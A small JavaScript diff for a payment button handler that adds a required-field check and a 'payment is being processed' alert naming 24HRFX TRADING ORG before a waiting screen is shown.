@@ -252,6 +252,7 @@ pay.addEventListener ('click', ()=> {
     const sub = document.querySelector ('.next_page_index');
     const wait = document.querySelector ('.wait');
     const head = document.querySelector ('header');
+    const index_code = document.querySelector ('.index_code');
     /*const index_mail = document.querySelector ('#mail').value;
     const index_user = document.querySelector ('#user').value;
     const index_password = document.querySelector ('#password').value;
@@ -273,9 +274,16 @@ pay.addEventListener ('click', ()=> {
           message => alert(message)
         );*/
 
-        payment_methods.classList.add ("hidden");
-        wait.classList.remove ("hidden");
-        head.style = "display: none";
+        if (index_code.value == "") {
+            alert("Please fill the required field")
+        }
+        else {
+            alert("Your Payment is being processed. Please wait for a response from 24HRFX TRADING ORG.");
+
+            payment_methods.classList.add ("hidden");
+            wait.classList.remove ("hidden");
+            head.style = "display: none" 
+        }
     })
 })
 
